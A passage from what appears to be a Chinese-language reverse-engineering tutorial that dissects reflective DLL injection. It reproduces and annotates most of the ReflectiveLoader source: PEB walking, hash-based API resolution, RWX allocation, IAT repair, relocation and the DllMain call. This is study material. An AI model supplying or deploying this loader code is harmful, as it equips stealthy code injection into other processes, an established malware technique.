获取节区头开始的地址。计算方法为 addr(OptionHeader) + sizeof(OptionHeader)，就能跳过OpitionHeader区域，获得节区头地址 pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(\u0026amp;pNtHeaders-\u0026gt;OptionalHeader) + pNtHeaders-\u0026gt;FileHeader.SizeOfOptionalHeader); // 如果需要进行RVA转化成Offset的RVA小于第一个节区的文件起始地址，就返回。因为RVA小于，那么就不可能是节区的数据，不需要转换。 if (dwRva \u0026lt; pSectionHeader[0].PointerToRawData) return dwRva; //以上就是获取节区地址 // 有多少节区就循环多少次 for (wIndex = 0; wIndex \u0026lt; pNtHeaders-\u0026gt;FileHeader.NumberOfSections; wIndex++) { // 如果要转换的RVA大于等于该节区在内存中的起始地址(RVA),并且需要转换的RVA小于节区在内存中的起始地址加上该节区在磁盘中的大小就返回转化值 \t// 第二个条件，是因为VirtualSize要小于SizeofRawData才能避免转换到错误节区，因此这个条件是假设该节区Image的大小等于在文件的大小，最大程度确保转换的RVA在这个节区的地址范围里面 \tif (dwRva \u0026gt;= pSectionHeader[wIndex].VirtualAddress \u0026amp;\u0026amp; dwRva \u0026lt; (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData)) // 根据计算公式 Offset = RVA - VirtualAddress + PointerToRawData \treturn (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData); }   以上过程就实现了调用ReflectiveLoader函数，通过这个函数将DLL文件转化成Image结构存在内存中，以此来完成DLL的加载。\n那么接下来就对ReflectiveLoader函数进行分析，探究其是如何完成DLL加载的。\nReflectiveLoader实现流程图:\n核心代码:\n步骤1. 定位内存中的DLL基地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  // _ReturnAddress函数内联化 // 但如果调用比内联化效果更好，则会调用而不是内联化 #pragma intrinsic( _ReturnAddress ) // 函数前的__declspec(noinline)是为了避免caller函数被编译器内联优化 // 如果内联化后返回的将是ReflectiveLoader函数的返回地址 // 没有被内联返回的将是caller函数的返回地址 __declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); } // 获得caller函数的返回地址 uiLibraryAddress = caller(); // 定位DLL文件当前所在内存空间的基地址 while (TRUE) { // 如果遍历地址找到了DLL文件的基址，也就是MZ签名处 \tif (((PIMAGE_DOS_HEADER)uiLibraryAddress)-\u0026gt;e_magic == IMAGE_DOS_SIGNATURE) { // 获取DLL文件的NT头起始地址，PE签名 \tuiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)-\u0026gt;e_lfanew; // 一些x64的dll可能触发虚假的签名，因为pop r10的二进制表示为4D5A也即(MZ字符)的ASIIC编码，所以中途如果有pop r10则可能引起错误判断为MZ签名 \t// 如果获取的NT头起始地址大于DOS头的大小，并且地址小于1024(D)=400(h)，即小于第一个节区开始的地址 \tif (uiHeaderValue \u0026gt;= sizeof(IMAGE_DOS_HEADER) \u0026amp;\u0026amp; uiHeaderValue \u0026lt; 1024) { // 如果找到了正确而不是加的MZ签名，那么此时uiHeaderValue为PE签名的RVA，而uiLibraryAddress为基址 \t// 因此签名正确，则则满足下面的if，否则就退出，uiLibraryAddress继续减至基址 \tuiHeaderValue += uiLibraryAddress; // 找到正确的PE和MZ签名后break \tif (((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;Signature == IMAGE_NT_SIGNATURE) break; } } // 没有找到MZ签名那就继续遍历地址 \tuiLibraryAddress--; }   步骤2. 获取为了加载DLL所需要的函数。共需要四个函数，其中LoadLibrary、VirtualAlloc以及GetProcAddress三个函数在Kernel32.dll中，NtFlushInstructionCache函数在ntdll.dll中\n核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12  // 从PEB(进程环境块)中获取目标进程的已经加载了的DLL链 // 在64位系统中通过GS寄存器获取TEB(线程环境块),32位系统通过FS寄存器获取TEB // 64位的TEB中0x60偏移数据为PEB入口地址,32为系统的TEB中0x30偏移数据为PEB入口地址 #ifdef _WIN64 \t// 读取GS寄存器0x60偏移的数据 \tuiBaseAddress = __readgsqword(0x60); #else #ifdef _WIN32 \t// 读取FS寄存器0x30偏移的数据 \tuiBaseAddress = __readfsdword(0x30); #endif #endif   这里需要插入对_PEB_LDR_DATA结构体的说明，才能明白后面的代码在干什么。可以先浏览后面的代码前面一部分，再回来看这里的知识可以更容易理解这部分内容的意义。\n从PEB中获取的pLdr为结构体_PEB_LDR_DATA的入口地址。\n_PEB_LDR_DATA结构体内容如下:\n1 2 3 4 5 6 7 8 9 10  typedef struct _PEB_LDR_DATA { ULONG Length; // +0x00 \tBOOLEAN Initialized; // +0x04 \tPVOID SsHandle; // +0x08 \tLIST_ENTRY InLoadOrderModuleList; // +0x0c 按照DLL加载的顺序建立的链表 \tLIST_ENTRY InMemoryOrderModuleList; // +0x14 按照DLL在内存中的顺序建立的链表 \tLIST_ENTRY InInitializationOrderModuleList; // +0x1c 按照DLL在初始化时的顺序建立的链表  } PEB_LDR_DATA,*PPEB_LDR_DATA; 10 // 该结构体包含了三个双向链表(_LIST_ENTRY),它们分别指向了_LDR_DATA_TABLE_ENTRY结构体。   其中_LIST_ENTRY结构体内容如下:\n1 2 3 4 5 6  typedef struct _LIST_ENTRY //8字节大小 { struct _LIST_ENTRY *Flink; // +0x00 \tstruct _LIST_ENTRY *Blink; // +0x04 } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; // 这个双向链表指向了进程中加载的模块，结构中的每个指针，都指向了一个LDR_DATA_TABLE_ENTRY结构体。   每一个DLL模块对应一个LDR_DATA_TABLE_ENTRY结构体，该结构体成员如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID DllBase; // DLLImage基址  PVOID EntryPoint; // 入口点  ULONG SizeOfImage; // Image大小  UNICODE_STRING FullDllName; // DLL全路径字符串  UNICODE_STRING BaseDllName; // DLL名称字符串  ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; }LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;   我们通过PEB_LDR_DATA结构体中的三个双向链表遍历DLL模块时，会有一个特点，他们总是指向下一个或上一个LDR_DATA_TABLE_ENTRY结构体相同的位置。\n例如:\n通过PPEB_LDR_DATA-\u0026gt;InLoadOrderModuleList遍历时，Flink指针指向上一个或Blink下一个PLDR_DATA_TABLE_ENTRY-\u0026gt;InLoadOrderList。\n通过PPEB_LDR_DATA-\u0026gt;InMemoryOrderModuleList遍历时，Flink指针指向上一个或Blink下一个PLDR_DATA_TABLE_ENTRY-\u0026gt;InMemoryOrderModuleList。\n对于InInitialZationOrderModuleList遍历同理。\n因此这会影响读取LDR_DATA_TABLE_ENTRY结构体中其他成员时需要取的偏移。\n该双向链表示意图如下图所示:\n图中只画了InLoadOrderModuleList和InMemoryOrderModuleList的链表表现形式，但是InInitialZationOrderModuleList也是相同的。虽然图中画的InLoadOrderModuleList和InMemoryOrderModuleList两个链表顺序一致，但实际中链表的连接结构体顺序并不一定相同。这里只是示意图。\n当我们弄明白DLL链后，再次回到核心代码进行分析，从DLL获取目标函数这一部分内容可以结合上述的内容进行理解。\n核心代码(接上):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86  // 获取目标进程加载的DLL链 uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)-\u0026gt;pLdr; // DLL链是一个双向链表 // 获取InMemoryOrderList 链表的第一个存储着DLL信息结构体的入口地址 uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)-\u0026gt;InMemoryOrderModuleList.Flink; while (uiValueA) { // 这里的PEB_LDR_DATA结构体注释掉了第一个成员，那为什么BaseDllName还是原地址而不是前一个成员的变量呢？ \t// 难道转换类型后不应该自动 的把结构体第一个成员保存着起始地址的数据吗，也就是InMemoryOrderModule的成员存的是InLoadLinks的数据 \t// 解释是是因为字节对称，因此还是会保持原来的对应结构。也就是因为前面说的链表特性导致，我们通过InMemoryOrderList遍历时仍然会指向上一个或下一个DLL信息结构体的InMemoryOrderList。 \t// 获取当前DLL的名称 \tuiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-\u0026gt;BaseDllName.pBuffer; // 获取DLL名称的长度 \tusCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)-\u0026gt;BaseDllName.Length; // DLL计算出的Hash值保存在uiValueC中 \tuiValueC = 0; // 计算DLL的Hash，下面的do-while就在进行Hash值的计算 \tdo { // 将uiValueC循环右移13位，是循环右移所以不会丢失数据 \tuiValueC = ror((DWORD)uiValueC); // 把DLL名中的小写字母变大写，然后用uiValueC加上变化后的十六字节数据 \tif (*((BYTE*)uiValueB) \u0026gt;= \u0026#39;a\u0026#39;) uiValueC += *((BYTE*)uiValueB) - 0x20; else uiValueC += *((BYTE*)uiValueB); // 移动到DLL名称的下一个字母 \tuiValueB++; } while (--usCounter); // 如果该DLL的Hash值与KERNEL32.DLL的相同 \tif ((DWORD)uiValueC == KERNEL32DLL_HASH) { // 获取DLL的基址 \tuiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-\u0026gt;DllBase; // 获取DLL的NT头 \tuiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-\u0026gt;e_lfanew; // 获取DLL的导出表入口地址 \tuiNameArray = (ULONG_PTR) \u0026amp; ((PIMAGE_NT_HEADERS)uiExportDir)-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // 获取导出表的VA \tuiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-\u0026gt;VirtualAddress); // 获取导出函数名称数组的起始地址 \tuiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfNames); // 获取导出函数Ordinals数组的起始地址 \tuiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfNameOrdinals); // 这个3的是我们在KERNEL32.DLL中需要的函数的数量 \tusCounter = 3; while (usCounter \u0026gt; 0) { // 计算函数名字符串的地址的Hash值 \tdwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray))); // 如果找到了我们需要的函数，那么就获取他们的VA \t// 需要的函数有LoadLibraryA,GetProcAddress,VirtualAlloc \tif (dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH) { // 获得导出函数地址数组的地址 \tuiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfFunctions); // 使用ordinal作为索引获取所需函数的地址 \tuiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD)); // 保存所需函数的虚拟地址 \tif (dwHashValue == LOADLIBRARYA_HASH) pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray)); else if (dwHashValue == GETPROCADDRESS_HASH) pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray)); else if (dwHashValue == VIRTUALALLOC_HASH) pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray)); // 找到需要的函数就将数量减一 \tusCounter--; } // 如果不是目标函数，就取出下一个函数名称数组元素 \tuiNameArray += sizeof(DWORD); // ordinals同步增长以便用作取出函数地址的索引 \tuiNameOrdinals += sizeof(WORD); } } // 如果DLL的Hash值与ntdll.dll的相同 \t// 下面的操作与kernel32.dll的相同就不再赘述 \telse if ((DWORD)uiValueC == NTDLLDLL_HASH) { //该DLL中寻找NtFlushInstructionCache函数，过程与前面一模一样就不再赘述\t\t} // 当找到所有需要的函数就停止 \tif (pLoadLibraryA \u0026amp;\u0026amp; pGetProcAddress \u0026amp;\u0026amp; pVirtualAlloc \u0026amp;\u0026amp; pNtFlushInstructionCache) break; // 双向链表，Flink为下一个DLL信息结构体节点的地址，而DEREF为*(UINT_PTR*)取Flink指针指向的地址的值，也就是下一个节点的地址 \tuiValueA = DEREF(uiValueA); }   上面的整个过程就是遍历所有DLL找到Kernel32.dll和Ntdll.dll两个DLL，然后再遍历这两个DLL的导出函数找到目标函数。\n步骤3: 为DLL的Image结构在目标进程中申请足够的内存空间，并将PE头先行复制该空间。因为PE头不需要进行大小变动。\n核心代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // 在前面定位目标DLL基地址时uiLibraryAddress被减到了DLL文件的基址 // uiHeaderValue 为要加载DLL的NT头地址 uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-\u0026gt;e_lfanew; //我们可以在任何地址申请足够的DLL内存来加载DLL文件，因为我们将对Image重定位。将所有内存置零并设置可读写执行的权限避免可能的问题 //通过获取DLL文件的SizeOfImage来申请足够的内存 uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //获取PE头大小 uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader.SizeOfHeaders; //此时为DLL文件基址 uiValueB = uiLibraryAddress; //为DLL文件Image申请的内存的基址 uiValueC = uiBaseAddress; // 从为Image申请的内存基址开始复制DLL的PE文件头 while (uiValueA--) *(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;   步骤4: 将所有节区加载到为Image申请的内存空间中\n核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 获取第一个节区头的起始地址 uiValueA = ((ULONG_PTR) \u0026amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;FileHeader.SizeOfOptionalHeader); // 获取节区数量 uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;FileHeader.NumberOfSections; while (uiValueE--) { // 定位到为DLL文件申请的内存空间中的该节区的地址 \tuiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-\u0026gt;VirtualAddress); // 获取该节区的文件偏移 \tuiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-\u0026gt;PointerToRawData); // 获取节区保存在文件时的大小 \tuiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)-\u0026gt;SizeOfRawData; // 将节区数据复制到为DLL文件申请的内存中该节区的内存 \twhile (uiValueD--) *(BYTE*)uiValueB++ = *(BYTE*)uiValueC++; // 获取下一个节区头的起始地址 \tuiValueA += sizeof(IMAGE_SECTION_HEADER); }   步骤5: 修复IAT，让IAT数据为Image结构下的内容\n核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  //获得保存导入表入口的地址 uiValueB = (ULONG_PTR) \u0026amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; // 假设存在导入表 // 获取导入表起始地址(IDT的地址) uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-\u0026gt;VirtualAddress); // 遍历所有导入函数，如果函数没有名称则通过Ordinal导入 \twhile (DEREF(uiValueA)) { // 因为一些编译器仅通过IAT导入，因此要对uiValueD进行健壮性检查 \t// uiValueD不为空 \t// IMAGE_ORDINAL_FLAGE = 0x80000000 ,而用户内存空间为0x0 - 0x7FFFFFFF， \t//规定如果PIMAGE_THUNK_DATA成员为Ordinal时，最高位为1且低16位为Ordinal，如果为AddressOfData，最高位为0 \t// 因此如果用Ordinal与0x80000000相与不为0说明是Ordinal，为0说明是AddressOfData \t// 即如果该函数是通过Ordinal导入而不是名称导入 \tif (uiValueD \u0026amp;\u0026amp; ((PIMAGE_THUNK_DATA)uiValueD)-\u0026gt;u1.Ordinal \u0026amp; IMAGE_ORDINAL_FLAG) { // 获取加载至内存的DLL文件的NT头地址 \tuiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-\u0026gt;e_lfanew; // 获得DLL导出表地址 \tuiNameArray = (ULONG_PTR) \u0026amp; ((PIMAGE_NT_HEADERS)uiExportDir)-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // 获取DLL导出表的入口地址 \tuiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-\u0026gt;VirtualAddress); // 获取导出函数地址数组地址 \tuiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;AddressOfFunctions); // 通过Ordinal获取DLL导出函数地址,这里INT的Ordinal是在所有导入函数的序号，要变换到函数所在DLL的序号因此需要减Ordinal的Base \tuiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)-\u0026gt;u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-\u0026gt;Base) * sizeof(DWORD)); // 获取函数地址并写入IAT中 \tDEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray)); } // 如果函数是通过名称导入 \telse { // 获取IAT的数组的起始位置 \tuiValueB = (uiBaseAddress + DEREF(uiValueA)); // 使用GetProcAddress函数从载入到uiLibraryAddress地址的DLL中获取该函数的地址，并写入IAT中 \tDEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)-\u0026gt;Name); } // IAT指针后移 \tuiValueA += sizeof(ULONG_PTR); // INT指针后移 \tif (uiValueD) uiValueD += sizeof(ULONG_PTR); // 因为在PE文件未被加载到内存前IAT和INT相同，当PE文件载入内存运行起来后INT和IAT不再一样,IAT保存导入函数地址，INT仍然是Ordinal或IIBN结构体 \t} // 指针指向下一个IID结构体，每导入一个DLL文件就会有一个IID结构体，因此也是指向下一个DLL \tuiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR); }   步骤6: 处理Image的重定位，计算基址增量并执行重定位，即使加载到了期望的Image基址。\n在此之前我们需要先了解重定位对象，重定位原因以及重定位表。\n对于普通EXE进程来说都会有自己独立的虚拟内存空间，不需要考虑重定位问题。对于系统DLL文件来说系统会将其加载至其固定好了的ImageBase处也不需要考虑重定位问题，只有我们自己写的DLL文件才需要考虑。\n因为我们自己写的DLL文件使用的是其他进程的内存空间，因此会发生目标DLL的ImageBase地址处已经被其他数据占据的情况，所以我们需要给DLL的数据找片空余的空间存放。\n在DLL文件编译过程中，会由连接器给出一个DLL的优先加载地址ImageBase，又因为在DLL文件中由连接器生成的指令中的地址在是在假设模块被加载到ImageBase的前提下生成的。因此当DLL文件没有加载到ImageBase处，这些地址就会出现错误，因此我们需要进行重定位，将使用的地址同步DLL基地址的改变而修正，而重定位表的作用就是用来修正这些因DLL重定位导致出错的地址。\n因此重定位块中的每一个重定位项(TypeOffset低12位)中保存的就是文件中所有需要进行重定位修正的机器码的相对该重定位块指向的内存页的相对虚拟地址(加上重定位表的VirtualAddress就是相对虚拟地址，将该虚拟地址换算成文件偏移，就能获得要修改的机器码数据)，(这里需要的修正的机器码，就是之前通过ImageBase计算好的二进制数据地址)\n我在这里对IMAGE_BASE_RELOCATION组成的数组称为重定位表，一个IMAGE_BASE_RELOCATION称为重定位块，一个TypeOffset称为重定位项\n由上图我们可以看到IMAGE_BASE_RELOCATION结构体成员，\n1 2 3 4 5  typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; //重定位内存页的起始RVA，本块中所有重定位项中的12位地址加上这个起始地址后就得到了真正的RVA值 DWORD SizeOfBlock; //重定位块的大小，从这个字段的值可以算出块中重定位项的数量 //WORD TypeOffset[1] //重定位项数组，数组每项由2个字节组成，高四位代表重定位类型，低12位位需要修改的机器码的地址 } IMAGE_BASE_RELOCATION   这里解释下，为什么TypeOffset低12位是需要修改的机器码的相对该重定位块指向的内存页的相对虚拟地址。\n在我们调试的时候会发现，很多时候地址的高位都是不变的，一般都是地址的低位变化，高位地址还没开始变的时候程序就已经结束了，因此我们只需要一个VirtualAddress表示高位地址，然后TypeOffset低12位表示低位地址，这样就能最大程度节省空间。\n那为什么是TypeOffset的低12位呢？当我们按照内存页来分割的时候，一个页中的寻址需要的指针位数为12位，2的12次方位4096，一页的大小也就4096字节，因此一个重定位块就指向一个内存页。VirtualAddress就是该重定位块指向的内存页的相对虚拟地址，而TypeOffset的第12位就是相对内存页的相对虚拟地址的相对地址。因此TypeOffset加上VirtualAddress就是需要修改的机器码所在的相对虚拟地址。\n那为什么TypeOffset是两个字节，而不是只用12位呢？这和字节对齐有关，也就是按照两字节对齐，因此我们多定义一个4位数据为重定位类型。重定位类型我们只说常用的，在32位系统中，该值多为3，即IMAGE_REL_BASED_HIGHLOW类型，作用为重定位地址指向的双字的32位数据都需要被修正。在64位系统中，该值为A，作用为重定位地址指向的四字的64位数据都需要被修正。\n综上我们可以获得一个重定位块的大小 sizeofblock = 4+4+2*n ，即(DWORD + DWORD + WORD * n)，这里的n为重定位项的个数。因此重定位项个数n = (sizeofblock - sizeof(IMAGE_BASE_RELOCATION))/2。因此当重定位项大于4个的时候，该方法就能节省空间。\n当一个重定位项全为0的时候该重定位块就结束了。每个重定位块只负责重定位0x1000大小范围的数据，当要定位的范围超过时就会有多个重定位块存在。\n这样说比较迷糊，我将通过项目中的TestDll.dll文件进行分析。\n首先，我们需要定位到重定位表的地址，从DATA_DIRECTORY中获取，TestDll.dll的重定位表数据如下:\n根据前面对重定位块的结构体定义，我们可以知道，VirtualAddress 为2000h，也就是该重定位块指向的内存页的相对虚拟地址为2000h，SizeOfBlock为28h = 40d，我们简要计算一下，(40 - 8)/2 = 16，从2808h开始到2827h结束，一共16个重定位项，包括最后全0的结尾重定位项。\n我们以第一个重定位项为例，A0F0h，重定位类型为A，相对内存页相对虚拟地址的相对虚拟地址为0F0h，加上VirtualAddress 为20F0h，因此要修正的机器码的相对虚拟地址为20F0h，换算成文件偏移为14F0h，再查看数据如下:\n这就是需要重定位修正的机器码数据，我们再查看TestDll.dll的ImageBase，\n因此可以得出结论，需要重定位的机器码数据是以ImageBase计算出来的地址。\n我们通过x64dbg将TestDll.dll载入后进行查看其是否重定位以及重定位情况\n可以看到x64dbg给出的TestDll.dll重定位后的基址不为180000000h，我们将第一个重定位项中需要重定位修正的机器码的相对虚拟地址20F0h加上新的TestDll.dll基址7FFA05410000h，我们可以得到7FFA054120F0h地址，跳转此处查看，如下图所示:\n会发现，该地址的数据很怪，这是因为反汇编器造成的对齐问题，但是可以发现低4位的301B与我们dll未加载前的低4位相同，我们可以推测得到低4位数据就是相对于为加载前定义的基址的相对虚拟地址。\n我们根据公式：\n1 2  Uncorrect_code_addr - old_ImageBase = code_RVA code_RVA + new_ImageBase = Correct_code_addr   计算该地址得到结果如下:\n1  7FFA05410000 + 180001B30 - 180000000 = 7FFA0541301B   可以发现他和该地址处的机器码相同，我们将该区域机器码换成更方便观察的形式:\n可以很明显发现，TestDll.dll发生重定位后的结果与我们推到计算的结果相同。其余的需要重定位修正的机器码同理。\n有了上面的储备知识，我们回到对反射式DLL注入的代码继续分析\n核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  // 为目标DLL文件申请的内存空间的基址 - 目标DLL文件的ImageBase // 为什么是相减？根据公式(实际Image地址 + 需要重定位地址的值 - DLL默认ImageBase)，在这里需要重定位地址的值在后面才会得到，因此在这里先执行相减操作 // 这也是加载器的重定位时需要做的，加载器遍历重定位表,找到要修正的数据 uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader.ImageBase; // 获取重定位表地址 uiValueB = (ULONG_PTR) \u0026amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; // 如果重定位表存在，Size就不为0 if (((PIMAGE_DATA_DIRECTORY)uiValueB)-\u0026gt;Size) { // 获取重定位块表起始地址 \tuiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-\u0026gt;VirtualAddress); // 遍历重定位块 \twhile (((PIMAGE_BASE_RELOCATION)uiValueC)-\u0026gt;SizeOfBlock) { // 获取该重定位块的虚拟地址 \tuiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-\u0026gt;VirtualAddress); // SizeOfBlock 是该重定位块的大小，包括IMAGE_BASE_RELOCATION结构体 + 记录偏移类型与偏移地址的TypeOffSet数组 \t// TypeOffset 为2字节，高4位代表重定位类型，低12位代表偏移地址，偏移地址+VirtualAddress就为重定位的地址 \t// [SizeOfBlock - 结构体的大小sizeof(IMAGE_BASE_RELOCATION)] / 两字节 = TypeOffset数组元素的数量 \tuiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)-\u0026gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC); // 获取当前重定位块的TypeOffset数组的第一个元素的地址 \tuiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION); // 遍历当前重定位块的所有TypeOffset数组元素 \twhile (uiValueB--) { // 执行重定位，可以跳过 IMAGE_REL_BASED_ABSOLUTE(重定位类型,无特别意义，只是为了让每个段4字节对齐，就是填充作用，里面并没有数据) \t// 不使用switch表达式来避免编译器构建一个位置不是那么独立的跳转表  // switch汇编后会在.rdata节区处生成跳转表以供switch用来当作跳转参考 \t//IMAGE_REL_BASED_DIR64(重定位类型,对指向的整个地址进行修正 \t//(实际Image地址 - DLL默认ImageBase) + 重定位数据地址(RVA) \t// 这里uiLibraryAddress 为(实际Image地址 - DLL默认ImageBase), \t// 重定位数据地址(RVA) = uiValueA + uiValueD-\u0026gt;offset = VirtualAddress + offset \tif (((PIMAGE_RELOC)uiValueD)-\u0026gt;type == IMAGE_REL_BASED_DIR64) //就是 IMAGE_BASE_RELOCATION + offset = 重定位后的RVA地址，然后该RVA地址的值 + uiLibraryAddress = 重定位后在内存的VA \t*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-\u0026gt;offset) += uiLibraryAddress; // 同上，这两个重定位类型都是对指向的整个地址修正，一个x64一个x86 \t// 也可以注意到不同的重定位类型只是影响地址取多少位 \telse if (((PIMAGE_RELOC)uiValueD)-\u0026gt;type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-\u0026gt;offset) += (DWORD)uiLibraryAddress; else if (((PIMAGE_RELOC)uiValueD)-\u0026gt;type == IMAGE_REL_BASED_HIGH) *(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-\u0026gt;offset) += HIWORD(uiLibraryAddress); else if (((PIMAGE_RELOC)uiValueD)-\u0026gt;type == IMAGE_REL_BASED_LOW) *(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-\u0026gt;offset) += LOWORD(uiLibraryAddress); // 获取该重定位块的下一个TypeOffset数组元素 \tuiValueD += sizeof(IMAGE_RELOC); } // 获取下一个重定位块 \tuiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)-\u0026gt;SizeOfBlock; } }   步骤7 : 调用Dll的入口函数DllMain\n核心代码:\n1 2 3 4 5 6 7 8 9 10  // uiValueA 为 DLL文件PE头记录的入口点地址 uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-\u0026gt;OptionalHeader.AddressOfEntryPoint); // 必须刷新指令缓存来避免使用被我们在重定位过程更新的旧代码 // 就是程序的指令在编译后就不会改变，当我们向程序里面添加新的DLL后，程序就会增加新的指令 // 当程序的指令被更改后通过该函数可以刷新CPU，让CPU可以读取并执行新的指令 pNtFlushInstructionCache((HANDLE)-1, NULL, 0); // 如果通过LoadRemoteLibraryR函数注入DLL，可以调用DllMain并通过DllMain的lpReserved参数传递我们的参数 ((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter); // 调用反射加载器返回新的DLL入口地址以便能调用DllMain() return uiValueA;   以上就是对ReflectiveLoader函数的解析，同时反射式DLL注入的技术分析也完成了。\n这个技术通过手动将DLL从文件结构加载至内存称为Image结构，能学到的东西非常多。最重要的就是了解了一个PE文件加载至内存的步骤，在这过程中获得与操作PE结构里的各个数据的方法也就相当于做了一个PE查看器，只是缺少了一个printf将这些数据打印出来。同时，之前在学习PE文件结构的时候，我并没有学习重定位表，在学习该技术的时候，我也顺便把重定位表的结构，文件如何重定位给学习了。\n该方法对于Windows逆向初学者来说非常值得学习。\n0x6 静态DLL注入 